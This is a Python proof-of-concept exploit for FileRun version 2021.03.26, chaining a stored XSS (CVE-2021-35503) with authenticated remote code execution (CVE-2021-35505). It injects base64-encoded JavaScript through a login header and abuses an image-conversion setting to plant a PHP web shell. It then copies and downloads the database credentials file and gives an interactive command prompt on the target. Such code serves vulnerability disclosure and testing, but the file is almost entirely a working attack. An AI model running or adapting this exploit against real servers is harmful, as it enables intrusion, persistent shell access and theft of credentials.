# Vendor Homepage: https://filerun.com
# Software Link: https://f.afian.se/wl/?id=SkPwYC8dOcMIDWohmyjOqAgdqhRqCZ3X&fmode=download&recipient=d3d3LmZpbGVydW4uY29t
# Version: 2021.03.26
# Tested on: Official Docker Image
# CVE: CVE-2021-35503 and CVE-2021-35505

# PoC for exploiting a chain of a stored XSS and authenticated Remote Code Execution
import requests
import time
import sys

payload = "dmFyIHhtbGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKdmFyIHVybCA9ICcvP21vZHVsZT1jcGFuZWwmc2VjdGlvbj1zZXR0aW5ncyZwYWdlPWltYWdlX3ByZXZpZXcmYWN0aW9uPWNoZWNrSW1hZ2VNYWdpY2snOwp2YXIgcGF5bG9hZCA9ICJlY2hvICc8P3BocCBlY2hvIHNoZWxsX2V4ZWMoJF9SRVFVRVNUW1wnY21kXCddKTsgPz4nICA+IHNoZWxsLnBocCAjIjsKeG1saHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICBpZiAoeG1saHR0cC5yZWFkeVN0YXRlID09IFhNTEh0dHBSZXF1ZXN0LkRPTkUpIHsKICAgICAgICAgICBpZiAoeG1saHR0cC5zdGF0dXMgPT0gMjAwKSB7CiAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyh4bWxodHRwLnJlc3BvbnNlVGV4dCk7CiAgICAgICAgICAgfQogICAgICAgIH0KfTsKeG1saHR0cC5vcGVuKCJQT1NUIiwgdXJsLCB0cnVlKTsKeG1saHR0cC5zZXRSZXF1ZXN0SGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIik7CnhtbGh0dHAuc2VuZCgibW9kZT1leGVjJnBhdGg9Y29udmVydHwiK3BheWxvYWQpOwo="

if not len(sys.argv) == 2:
    print("missing target url")
    sys.exit(1)

target = sys.argv[1]


def inject_code():
    requests.post("%s/?module=fileman&page=login&action=login" % target,
                  data={'username': 'qwerty', 'password': 'qwerty', 'otp': '', 'two_step_secret': '', 'language': ''},
                  headers={'X-Forwarded-For': '<img src="/asdasdasd" onerror=eval(atob("%s")) >' % payload})


def check_shell_exists():
    req = requests.get("%s/shell.php" % target)
    if req.status_code != 200:
        return False
    return True


def process_command(cmd):
    req = requests.get("%s/shell.php?cmd=%s" % (target, cmd))
    print(req.text)


while True:
    print("Injecting new log message...")
    inject_code()
    time.sleep(10)
    if check_shell_exists():
        print("Shell exists under '%s/shell.php?cmd=ls'" % target)
        break
print("Lets get autoconfig.php which contains database credentials...")
process_command("cp system/data/autoconfig.php js/autoconfig.txt")

ac_resp = requests.get("%s/js/autoconfig.txt" % target)
with open("filerun.autoconfig.php", "wb") as ac_f:
    ac_f.write(ac_resp.content)
process_command("rm js/autoconfig.txt")

while True:
    command = input("Command:")
    process_command(command)
